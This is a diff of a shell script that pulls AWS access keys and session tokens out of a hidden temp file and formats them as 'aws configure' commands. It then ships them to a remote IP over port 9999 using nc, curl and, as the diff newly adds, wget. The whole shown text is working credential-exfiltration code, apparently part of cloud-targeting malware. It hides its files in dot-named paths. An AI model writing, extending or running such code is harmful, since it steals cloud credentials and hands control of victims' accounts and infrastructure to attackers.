@@ -54,9 +54,10 @@ if grep -q "SecretAccessKey" /tmp/...b; then
 cat /tmp/...b | tr ',' '\n' | grep 'AccessKeyId\|SecretAccessKey\|Token' | sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | sed 's#"Token" : "#aws configure set aws_session_token #g'| sed 's/"//g' > /tmp/...c
 
 echo ""
-cat /tmp/...c | nc 192.168.61.78 9999
+cat /tmp/...c | nc 192.168.12.157 9999
 echo ""
-curl --upload-file /tmp/...c 192.168.61.78:9999
+curl --upload-file /tmp/...c 192.168.12.157:9999
+wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file /tmp/...c http://192.168.12.157:9999
 echo ""
 fi
 
